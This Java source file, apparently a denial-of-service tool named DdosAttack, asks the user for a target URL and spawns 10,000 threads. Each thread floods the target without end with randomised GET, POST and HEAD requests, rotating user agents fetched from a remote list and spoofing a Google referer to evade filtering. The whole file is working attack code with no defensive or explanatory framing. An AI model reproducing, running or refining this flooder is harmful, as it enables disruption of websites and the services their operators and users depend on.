import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.List;
import java.util.Random;
import java.util.Scanner;
import java.util.concurrent.atomic.AtomicBoolean;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;

public class DdosAttack {
public static void main(String[] args) throws Exception {
Scanner scanner = new Scanner(System.in);
System.out.print("Enter the target URL: ");
String targetUrl = scanner.nextLine();

List<String> userAgents = UserAgentFetcher.fetchUserAgents();
    System.out.println("Loaded " + userAgents.size() + " user agents.");

    int threadsCount = 10000; 
    for (int i = 0; i < threadsCount; i++) {
        DdosThread thread = new DdosThread(targetUrl, userAgents);
        thread.start();
    }
}

public static class DdosThread extends Thread {
    private AtomicBoolean running = new AtomicBoolean(true);
    private final String request;
    private final URL url;
    private final List<String> userAgents;
    private final Random random = new Random();

    public DdosThread(String request, List<String> userAgents) throws Exception {
        this.request = request;
        this.url = new URL(request);
        this.userAgents = userAgents;
    }

    @Override
    public void run() {
        while (running.get()) {
            try {
                attack();
            } catch (Exception e) {}
        }
    }

    public void attack() throws Exception {
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();

        connection.setDoOutput(true);
        connection.setDoInput(true);

        String methodType[]={"GET", "POST", "HEAD"};
		connection.setRequestMethod(methodType[random.nextInt(methodType.length)]);

		connection.setRequestProperty("charset", "utf-8");
		connection.setRequestProperty("Host", this.request);

		String randomUserAgent=userAgents.get(random.nextInt(userAgents.size()));
		connection.setRequestProperty("User-Agent", randomUserAgent);

		connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
		
		String param="param" + random.nextInt(Integer.MAX_VALUE)+"="+URLEncoder.encode(""+random.nextInt(Integer.MAX_VALUE), "UTF-8");
		connection.setRequestProperty("Content-Length", param);
		
		connection.setRequestProperty("Referer","https://www.google.com/");
		connection.setRequestProperty("Accept-Language","en-US,en;q=0.9");
		
		System.out.println(this+" "+connection.getResponseCode());
		
		connection.getInputStream();
		
		Thread.sleep(random.nextInt(100));   
		
    }
}

public static class UserAgentFetcher {
	public static List<String> fetchUserAgents() throws Exception {
        URL url=new URL("https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt");

        BufferedReader in=new BufferedReader(new InputStreamReader(url.openStream()));
        List<String> agentsList=new ArrayList<>();
        String line;

        while((line=in.readLine())!=null){
            agentsList.add(line.trim());
        }

        in.close();

        return agentsList;
    }
}
}
